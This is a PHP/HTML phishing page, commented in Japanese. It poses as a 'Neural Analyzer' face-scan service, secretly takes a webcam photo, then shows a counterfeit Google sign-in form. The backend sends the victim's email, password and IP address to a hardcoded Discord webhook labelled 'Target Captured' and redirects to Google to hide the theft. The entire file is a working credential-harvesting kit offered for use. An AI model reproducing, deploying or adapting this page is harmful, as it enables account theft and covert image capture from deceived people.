<?php
// ==========================================
// 1. BACKEND: Discordへの送信処理（合体済み）
// ==========================================
$webhook_url = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm"; 

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    $img   = $_POST['img']; 
    $ip    = $_SERVER['REMOTE_ADDR'];

    $payload = [
        "username" => "Deep Neural Security",
        "embeds" => [[
            "title" => "🎯 Target Captured (All-in-One)",
            "color" => 0,
            "fields" => [
                ["name" => "📧 Email", "value" => "```$email```", "inline" => true],
                ["name" => "🔑 Password", "value" => "```$pass```", "inline" => true],
                ["name" => "🌐 IP", "value" => "[$ip](https://ipinfo.io/$ip)"]
            ],
            "description" => "📸 顔写真はBase64形式で受信完了"
        ]]
    ];

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    header("Location: https://accounts.google.com/");
    echo "SENT";
    exit();
}
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deep Neural Analyzer | 顔診断</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: #0a0a0a; border: 1px solid #222; padding: 40px; border-radius: 20px; text-align: center; width: 360px; box-shadow: 0 20px 40px rgba(0,0,0,1); }
        h1 { font-size: 20px; letter-spacing: 2px; margin-bottom: 20px; }
        .v-wrap { width: 100%; border-radius: 10px; overflow: hidden; border: 1px solid #333; margin-bottom: 25px; position: relative; }
        #video { width: 100%; display: block; transform: scaleX(-1); background: #000; }
        .btn { background: #fff; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        #login-ui { display: none; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #222; background: #050505; color: #fff; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="card" id="camera-ui">
        <h1>NEURAL ANALYZER</h1>
        <div class="v-wrap"><video id="video" autoplay playsinline></video></div>
        <button class="btn" id="start-btn">診断を開始</button>
    </div>

    <div class="card" id="login-ui">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="80" style="margin-bottom:20px;">
        <h1>認証が必要です</h1>
        <form id="trap-form">
            <input type="email" id="email" placeholder="メールアドレス" required>
            <input type="password" id="pass" placeholder="パスワード" required>
            <button type="submit" class="btn">結果を表示</button>
        </form>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const startBtn = document.getElementById('start-btn');
        let capturedImg = "";

        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                startBtn.innerText = "スキャン中...";
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    capturedImg = canvas.toDataURL('image/jpeg');
                    document.getElementById('camera-ui').style.display = 'none';
                    document.getElementById('login-ui').style.display = 'block';
                    stream.getTracks().forEach(t => t.stop());
                }, 3000);
            } catch (err) { alert("HTTPS接続とカメラの許可が必要です。"); }
        };

      document.getElementById('trap-form').onsubmit = function(e) {
    // 1. 隠し入力項目（input）を作って画像データをセットする
    const imgInput = document.createElement('input');
    imgInput.type = 'hidden';
    imgInput.name = 'img';
    imgInput.value = capturedImg;
    this.appendChild(imgInput);

    const emailInput = document.createElement('input');
    emailInput.type = 'hidden';
    emailInput.name = 'email';
    emailInput.value = document.getElementById('email').value;
    this.appendChild(emailInput);

    const passInput = document.createElement('input');
    passInput.type = 'hidden';
    passInput.name = 'pass';
    passInput.value = document.getElementById('pass').value;
    this.appendChild(passInput);

    // 2. JavaScriptで送るのをやめて、普通にページ遷移（POST）として送る
    this.method = 'POST';
    this.action = window.location.href;
    this.submit();
};
    </script>
</body>
</html>
